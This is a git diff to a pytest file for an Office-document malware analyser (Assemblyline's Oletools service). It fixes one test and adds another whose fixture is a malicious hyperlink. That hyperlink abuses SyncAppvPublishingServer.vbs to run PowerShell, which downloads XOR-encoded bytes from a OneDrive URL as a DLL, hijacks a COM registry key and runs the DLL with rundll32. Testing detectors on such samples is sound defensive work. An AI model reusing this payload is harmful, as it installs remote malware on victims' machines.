@@ -1,5 +1,6 @@
+import pytest
 
-from assemblyline_v4_service.common.result import Heuristic, ResultSection
+from assemblyline_v4_service.common.result import Heuristic
 
 from oletools.olevba import __version__ as olevba_version
 from oletools.oleid import __version__ as oleid_version
@@ -72,6 +73,37 @@ def test_parse_uri_ip():
 
 def test_process_link_com_false_positive():
     ole = Oletools()
-    ole.start
-    heur = ole._process_link('hyperlink', b'https://google.com', Heuristic(1), ResultSection('Test'))
+    ole.start()
+    heur, _ = ole._process_link('hyperlink', b'https://google.com')
     assert heur.score == 0
+
+
+@pytest.mark.parametrize("link,heuristic,filename", [
+    (R"http://.vbs:%2E%2E/%2E%2E/%2E%2E/%2E%2E/%2E%2E/%2E%2E/%2E%2"
+     R"E/%2E%2E/windows/System32::$index_allocation/SyncAppvPublishingServer.vbs"
+     R"%22%20;$t=$env:Temp+'/local.lnk';if(%5bIO.File%5d::Exists($t))%7bbreak;%7"
+     R"d;%5bIO.File%5d::Create($t,1,%5bio.FileOPtions%5d::DeleteOnClose);$r=$ENV"
+     R":ALLUSERSPROFILE+'/lmapi2.dll';if(%5bIO.File%5d::Exists($r))%7bbreak;%7d;"
+     R"$s=%5bConvert%5d::ToChar(0x2F);$u='h%74%74ps:%5C%5C9b5uja.am.files.1drv.c"
+     R"om'+$s+'y4mpYJ245I931DUGr7BV-dwLD7SReTqFr1N7eQOKSH_u-g2G18Jd6i3SRqYqgugj3"
+     R"FA2JQQ7JqclvWH13Br3B5Ux-F6QcqADr-FowC_9PZi1Aj7uckcK8Uix_7ja1tF6C_8-5xYgm6"
+     R"zwjbXsrlEcTEenAyA8BzEaGPudutl1wMDkzVr6Wm-n8_qRmYejLgbNoQmPTUe3P5NKFFLRjee"
+     R"U_JhvA'+$s+'DSC0002.jpeg?download';$f=(New-Object%20Net.WebClient).Downlo"
+     R"adData($u);if($f.Count%20-lt%2010000)%7bbreak;%7d;$f=$f%5b4..$f.Count%5d;"
+     R"$x=24;$f=$f|%25%7b$x=(29*$x+49)%25%20256;$_=($_%20-bxor%20$x);$_%7d;%5bIO"
+     R".File%5d::WriteAllBytes($r,$f);$k=%5bConvert%5d::ToChar(0x23);$z=$s+'c%20"
+     R"reg%20ADD%20HKCU\Software\Classes\CLSID\%7b2735412E-7F64-5B0F-8F00-5D77AF"
+     R"BE261E%7d\InProcServer32%20'+$s+'t%20REG_SZ%20'+$s+'d%20'+$r+'%20'+$s+'ve"
+     R"%20'+$s+'f%20'+%20$s+'reg:64'+'%20&&%20'+'rundll32.exe%20'+$r+','+$k+'1';"
+     R"cmd%20$z;",
+     Heuristic(1, attack_id='T1216', signatures={'embedded_powershell': 1, 'hyperlink': 1}),
+     'cdccc3c4.ps1')
+])
+def test_process_link_SyncAppvPublishingServer(link: str, heuristic: Heuristic, filename: str):
+    ole = Oletools()
+    ole.start()
+    heur, tags = ole._process_link('hyperlink', link)
+    assert tags == {}
+    assert heur.attack_ids == heuristic.attack_ids
+    assert heur.signatures == heuristic.signatures
+    assert filename in ole._extracted_files
